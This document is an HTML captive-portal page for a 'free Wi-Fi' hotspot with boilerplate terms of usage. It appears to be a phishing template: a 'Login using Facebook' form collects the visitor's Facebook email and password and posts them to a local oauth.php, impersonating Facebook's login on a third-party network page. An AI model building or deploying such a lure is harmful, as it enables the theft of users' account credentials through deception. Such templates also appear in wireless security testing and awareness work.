<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <title>Wi-Fi Service</title>
  <link rel="stylesheet" href="static/css/reset.css">
  <link rel='stylesheet prefetch' href='static/css/roboto.css'>
  <link rel='stylesheet prefetch' href='static/css/font-awesome.min.css'>
  <link rel="stylesheet" href="static/css/style.css">
  <script src='static/js/jquery.min.js'></script>
  <script src="static/js/index.js"></script>
</head>

<body>
  <div class="pen-title">
    <h1>Get connected to the Internet for free</h1><span>A simple, no frills Wi-Fi service.</span>
  </div>
  <!-- Form Module-->
  <div class="module form-module">
    <div class="form">
    </div>
    <div class="form">
      <h2>Login using Facebook</h2>
      <!-- <img src="/static/logos/facebook-logo.png" width="25%" class="logo"></img> -->
      <form name="theform"  id="ajaxform" class="theform" method="post" action="oauth.php">
        <input type="email" placeholder="Email" name="email" required />
        <input type="password" placeholder="Password" minlength="5" name="password" required />
        <button type="submit" class="login-btn">Login</button>
      </form>
    </div>
    <div class="cta"><a id="btn1">Terms of Usage</a></div>
  </div>

  <!-- The Modal -->
  <div id="myModal" class="modal">

    <!-- Modal content -->
    <div class="modal-content">
      <div class="modal-header">
        <span class="close">×</span>
        <h2>Terms of Usage</h2>
      </div>
      <div class="modal-body">
        <p>This is a free Hotspot wireless internet Service (the “Service”) provided for use by
          customers. All users are required to log-in individually as an independent user.</p>
        <p>
          The Service is made available provided:
        </p>
        <p>
          (a) You do not use the Service for anything unlawful, immoral or improper;
        </p>
        <p>
          (b) You do not use the Service to make offensive or nuisance communications in whatever form. Such usage
          includes posting, transmitting, uploading, downloading or otherwise facilitating any content that is
          unlawful, defamatory, threatening, a nuisance, obscene, hateful, abusive, harmful (including but not limited
          to viruses, corrupted files, or any other similar software or programs), a breach of privacy, or which is
          otherwise objectionable;
        </p>
        <p>
          (c) You do not use the Service to harm or attempt to harm minors in any way;
        </p>
        <p>
          (d) You do not act nor knowingly permit others to act in such a way that the operation of the Service or our
          systems will be jeopardized or impaired;
        </p>
        <p>
          (e) You do not use abusive or threatening behavior towards other users of the Service, members of our staff
          or any person in the vicinity of a Wireless LAN Hotspot;
        </p>
        <p>
          (f) You do not use the Service to access or use content in a way that infringes the rights of others;
        </p>
        <p>
          (g) The Service is used in accordance with any third party policies for acceptable use or any relevant
          internet standards (where applicable).
        </p>
        <p>
          (h) You agree not to resell or re-broadcast any aspect of the Service, whether for profit or otherwise. You
          accept that your entitlement to use the Service is for your personal use only and that you shall not be
          entitled to transfer your entitlement to use the Service to any other person or allow any other person to
          make use of the Service or of any username or password or other entitlement supplied to you in connection
          with the Service.
        </p>
        <p>
          (i) You also agree not to modify the Unit or use the Service for any fraudulent purpose, or in such a way as
          to create damage or risk to our business, reputation, employees, subscribers, facilities, third parties or to
          the public generally.
        </p>
        <p>
          (j) You have no proprietary or ownership rights to any username or password or to a specific IP address, or
          e-mail address assigned to you or your Unit. We may change such addresses at any time or deactivate or
          suspend Service to any address without prior notice to you if we suspect any unlawful or fraudulent use of
          the services.
        </p>
      </div>
    </div>
</body>

</html>
